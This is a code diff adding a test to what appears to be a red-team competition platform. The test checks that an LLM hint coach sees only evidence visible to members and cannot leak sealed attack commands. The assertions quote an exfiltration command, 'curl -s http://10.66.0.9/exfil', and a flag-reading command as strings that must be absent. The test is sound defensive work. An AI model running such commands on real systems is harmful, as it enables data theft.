@@ -129,3 +129,31 @@ def test_competition_live_detections_and_score_sealed(client, users):
                           headers=users["op"]).json()
     assert ops_live["red_phase"] == "priv-esc"
     assert ops_live["detections"][0]["objective"] == "foothold"
+
+
+def test_competition_hint_coach_sees_only_member_visible_evidence(
+        client, users):
+    """The reproduced leak, closed: the coach reasons over the SAME
+    filtered evidence the member may read, so a hint cannot launder
+    sealed attack commands back to the requester."""
+    from srplatform.api import coach_routes
+    sid = _comp_session(client, users)
+    _seed_spoilers(sid)
+    seen = {}
+
+    class FakeCoach:
+        def complete(self, system, user):
+            seen["prompt"] = (system or "") + "\n" + (user or "")
+            return "Check web01 for unexpected accounts."
+
+    coach_routes.set_coach_llm(FakeCoach())
+    try:
+        r = client.post(f"/sessions/{sid}/hint", json={"question": "where?"},
+                        headers=users["member"])
+        assert r.status_code == 200, r.text
+    finally:
+        coach_routes.set_coach_llm(None)
+    prompt = seen.get("prompt", "")
+    assert "cat /root/flag" not in prompt, prompt
+    assert "curl -s http://10.66.0.9/exfil" not in prompt, prompt
+    assert "foothold" not in prompt or "redacted" in prompt, prompt
